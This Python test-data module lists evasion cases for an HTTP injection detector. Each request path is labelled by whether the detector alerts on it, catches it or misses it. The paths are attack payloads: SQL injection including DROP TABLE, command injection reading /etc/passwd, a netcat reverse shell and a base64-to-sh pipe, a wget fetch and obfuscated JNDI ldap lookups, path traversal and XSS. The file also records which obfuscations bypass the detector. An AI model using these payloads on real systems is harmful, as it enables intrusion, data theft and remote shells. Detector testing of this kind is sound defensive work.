"""Known evasion techniques against the Tier 2 HTTP injection detector.

Each case is a request path (the detector inspects the path and query, nothing else) and the
label a human would expect. `expect` is what the detector does *today*:

* ``caught``  : a finding with the expected label at confidence >= 0.3 (the detector's floor).
* ``alert``   : caught at >= 0.7, which is the confidence at which the control plane raises an
  alert on its own without a matching rule.
* ``missed``  : a known gap. The test asserts the miss so that fixing the detector flips the
  test, and the report (docs/evasion-report.md) gets regenerated.

Techniques come from the public literature on WAF and IDS evasion (OWASP testing guide, the
usual payload lists). This is a measurement of one heuristic detector, not a claim about
detection rates on real traffic.
"""

from __future__ import annotations

from dataclasses import dataclass

from neurawall.core.models import ThreatLabel

SQL, CMD, SSTI = (
    ThreatLabel.SQL_INJECTION,
    ThreatLabel.COMMAND_INJECTION,
    ThreatLabel.TEMPLATE_INJECTION,
)
TRAV, XSS = ThreatLabel.PATH_TRAVERSAL, ThreatLabel.XSS


@dataclass(frozen=True)
class Case:
    klass: str
    technique: str
    path: str
    label: ThreatLabel
    expect: str  # "alert" | "caught" | "missed"
    note: str = ""


CASES: list[Case] = [
    # ---- SQL injection
    Case(
        "SQL injection",
        "baseline UNION SELECT",
        "/item?id=1' UNION SELECT user,pass FROM users--",
        SQL,
        "alert",
    ),
    Case(
        "SQL injection",
        "mixed case",
        "/item?id=1' uNiOn SeLeCt user,pass FrOm users--",
        SQL,
        "alert",
    ),
    Case(
        "SQL injection",
        "comment as whitespace",
        "/item?id=1'/**/UNION/**/SELECT/**/pass/**/FROM/**/users--",
        SQL,
        "alert",
    ),
    Case(
        "SQL injection",
        "URL-encoded",
        "/item?id=1%27%20UNION%20SELECT%20pass%20FROM%20users--",
        SQL,
        "alert",
    ),
    Case(
        "SQL injection",
        "double URL-encoded",
        "/item?id=1%2527%2520UNION%2520SELECT%2520pass%2520FROM%2520users--",
        SQL,
        "alert",
    ),
    Case(
        "SQL injection",
        "newline as whitespace",
        "/item?id=1'%0aUNION%0aSELECT%0apass%0aFROM%0ausers--",
        SQL,
        "alert",
    ),
    Case("SQL injection", "tautology without quotes", "/item?id=1 AND 1=1", SQL, "caught"),
    Case(
        "SQL injection",
        "time-based blind",
        "/item?id=1;SELECT pg_sleep(5)--",
        SQL,
        "caught",
        "a single strong pattern scores 0.50, under the alert-grade line",
    ),
    Case(
        "SQL injection",
        "stacked query",
        "/item?id=1;DROP TABLE users--",
        SQL,
        "caught",
        "a single strong pattern scores 0.62, under the alert-grade line",
    ),
    Case(
        "SQL injection",
        "MySQL versioned comment",
        "/item?id=1/*!50000UNION*//*!50000SELECT*/pass/*!50000FROM*/users",
        SQL,
        "missed",
        "the comment stripper removes the whole /*!...*/ block, including the keyword inside it",
    ),
    Case(
        "SQL injection",
        "full-width Unicode keywords",
        "/item?id=1' %EF%BC%B5%EF%BC%AE%EF%BC%A9%EF%BC%AF%EF%BC%AE SELECT 1--",
        SQL,
        "missed",
        "lower-casing does not fold full-width letters, and no rule fires without the keywords",
    ),
    Case(
        "SQL injection",
        "quadruple URL-encoding",
        "/item?id=1%25252527%252520UNION%252520SELECT%252520pass%252520FROM%252520users--",
        SQL,
        "alert",
        "still caught, through the other rules, although the UNION rule itself does not fire",
    ),
    # ---- Command injection
    Case(
        "Command injection", "separator + cat", "/ping?host=1.1.1.1;cat /etc/passwd", CMD, "alert"
    ),
    Case(
        "Command injection",
        "pipe + id",
        "/ping?host=1.1.1.1|id",
        CMD,
        "caught",
        "one pattern scores 0.62, under the alert-grade line",
    ),
    Case(
        "Command injection",
        "command substitution",
        "/ping?host=$(whoami)",
        CMD,
        "caught",
        "one pattern scores 0.62, under the alert-grade line",
    ),
    Case(
        "Command injection",
        "backticks",
        "/ping?host=`id`",
        CMD,
        "caught",
        "one pattern scores 0.62, under the alert-grade line",
    ),
    Case(
        "Command injection",
        "${IFS} as whitespace",
        "/ping?host=1;cat${IFS}/etc/passwd",
        CMD,
        "alert",
    ),
    Case(
        "Command injection",
        "base64 into a shell",
        "/ping?host=1;echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh",
        CMD,
        "caught",
        "caught through the `| sh` rule alone (0.62)",
    ),
    Case(
        "Command injection",
        "reverse shell",
        "/ping?host=1;nc 10.0.0.1 4444 -e /bin/sh",
        CMD,
        "alert",
    ),
    Case(
        "Command injection",
        "quote splitting",
        "/ping?host=1;c'a't /etc/passwd",
        CMD,
        "missed",
        "c'a't defeats the command-name rule; /etc/passwd alone scores 0.27, under the floor",
    ),
    Case(
        "Command injection",
        "wildcards instead of names",
        "/ping?host=1;/???/c?t /e??/p??s??",
        CMD,
        "missed",
        "neither a known command name nor a literal sensitive path appears",
    ),
    Case(
        "Command injection",
        "newline separator, no sensitive file",
        "/ping?host=1%0awget http://x.test/a",
        CMD,
        "missed",
        "a newline is not in the separator list",
    ),
    # ---- Template injection
    Case(
        "Template injection",
        "Jinja expression",
        "/greet?name={{7*7}}",
        SSTI,
        "missed",
        "a lone {{7*7}} probe scores 0.27, under the 0.3 floor",
    ),
    Case(
        "Template injection",
        "Jinja introspection",
        "/greet?name={{''.__class__.__mro__}}",
        SSTI,
        "alert",
    ),
    Case("Template injection", "JNDI lookup", "/x?q=${jndi:ldap://x.test/a}", SSTI, "alert"),
    Case(
        "Template injection",
        "obfuscated JNDI",
        "/x?q=${${lower:j}ndi:ldap://x.test/a}",
        SSTI,
        "missed",
        "the JNDI rule does not fire, and the template-expression rule alone scores 0.27",
    ),
    Case(
        "Template injection",
        "Jinja statement block",
        "/greet?name={%print(7*7)%}",
        SSTI,
        "missed",
        "only {{ }}, ${ }, <% %> and #{ } are recognised",
    ),
    # ---- Path traversal
    Case(
        "Path traversal",
        "dot-dot-slash, three levels",
        "/files?name=../../../etc/passwd",
        TRAV,
        "alert",
    ),
    Case(
        "Path traversal",
        "URL-encoded slashes",
        "/files?name=..%2f..%2f..%2fetc%2fpasswd",
        TRAV,
        "alert",
    ),
    Case(
        "Path traversal",
        "backslashes",
        "/files?name=..\\..\\..\\windows\\win.ini",
        TRAV,
        "caught",
        "one pattern scores 0.62, under the alert-grade line",
    ),
    Case(
        "Path traversal",
        "absolute sensitive path",
        "/files?name=/etc/passwd",
        CMD,
        "missed",
        "a reference to /etc/passwd alone scores 0.27, under the 0.3 floor",
    ),
    Case(
        "Path traversal",
        "single level",
        "/files?name=../secret.txt",
        TRAV,
        "missed",
        "two or more consecutive ../ are required",
    ),
    Case("Path traversal", "Tomcat ..;/ form", "/files/..;/..;/admin", TRAV, "missed"),
    Case(
        "Path traversal",
        "nested ....// form",
        "/files?name=....//....//....//secret",
        TRAV,
        "missed",
        "a filter that strips ../ once turns this into ../../.. on the server; the detector does not recognise it",
    ),
    # ---- XSS
    Case(
        "XSS",
        "script tag",
        "/s?q=<script>alert(1)</script>",
        XSS,
        "caught",
        "the canonical payload scores 0.62, under the alert-grade line",
    ),
    Case(
        "XSS",
        "mixed-case script tag",
        "/s?q=<ScRiPt>alert(1)</sCrIpT>",
        XSS,
        "caught",
        "0.62, under the alert-grade line",
    ),
    Case(
        "XSS",
        "URL-encoded script tag",
        "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
        XSS,
        "caught",
        "0.62, under the alert-grade line",
    ),
    Case(
        "XSS",
        "img onerror",
        "/s?q=<img src=x onerror=alert(1)>",
        XSS,
        "caught",
        "one pattern scores 0.45, under the alert-grade line",
    ),
    Case(
        "XSS",
        "svg onload without space",
        "/s?q=<svg/onload=alert(1)>",
        XSS,
        "caught",
        "one pattern scores 0.45, under the alert-grade line",
    ),
    Case("XSS", "javascript: URI", "/s?next=javascript:alert(1)", XSS, "caught"),
    Case(
        "XSS",
        "HTML-entity encoded tag",
        "/s?q=&#60;script&#62;alert(1)&#60;/script&#62;",
        XSS,
        "missed",
        "entities are not decoded",
    ),
    Case("XSS", "javascript: with an entity", "/s?next=javascript&colon;alert(1)", XSS, "missed"),
    Case(
        "XSS",
        "ontoggle handler",
        '/s?q="><details open ontoggle=alert(1)>',
        XSS,
        "missed",
        "only error, load, mouseover and focus handlers are listed",
    ),
]
